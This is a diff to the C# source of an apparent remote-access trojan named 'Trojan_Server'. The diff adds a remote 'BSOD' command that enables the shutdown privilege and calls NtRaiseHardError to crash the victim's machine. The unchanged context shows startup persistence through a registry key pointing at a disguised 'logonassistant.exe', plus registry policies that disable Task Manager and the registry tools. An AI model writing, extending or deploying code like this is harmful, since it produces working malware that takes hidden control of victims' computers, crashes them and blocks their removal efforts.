@@ -11,6 +11,10 @@ namespace Trojan_Server
 {
     class Program
     {
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege,
+                bool IsThreadPrivilege, out bool PreviousValue);
+
         public Type typeShell=null;
         public object objShell=Type.Missing;
         
@@ -35,7 +39,6 @@ namespace Trojan_Server
         );
         [DllImport("user32.dll")]
 		public static extern int ShowWindow(int Wnd, int Flags);
-
         public static NetworkStream Reciver;
         [DllImport("kernel32.dll")]
         public static extern bool FreeConsole();
@@ -121,6 +124,9 @@ namespace Trojan_Server
                             ShowWindow(FindWindow("Progman", "Program Manager"), 1);
                             Log("Show Desktop!", "COMMAND");
                             break;
+                        case "BSOD":
+                            crash();
+                        break;
                     }
                 }
                 catch
@@ -169,7 +175,7 @@ namespace Trojan_Server
 	                k.SetValue("logonassist", "C:\\Windows\\SysWOW64\\logonassistant.exe", RegistryValueKind.String);
 	                k.Close();
                 Log("Startup RegistryKey angelegt!", "DEBUG");
-                Log("Trying to make DisableTaskMgr Key", "DEBUG");
+                Log("Trying to make DisableTaskMgr Key and DisableRegTools", "DEBUG");
                 RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                 objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                 objRegistryKey.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
@@ -204,6 +210,18 @@ namespace Trojan_Server
         	{
         		sw.Close();
         	}
+        }
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern void NtRaiseHardError(uint errorStatus,
+        int a, int b, int c, /* Unused */
+        int responseOption,
+        out int response);
+
+        public static void crash()
+        {
+            bool x; int y;
+            RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, true, false, out x);
+            NtRaiseHardError(0xc0000022, 0, 0, 0, 6 /* OptionShutdownSystem */, out y);
         }
         static void Main(string[] args)
         {
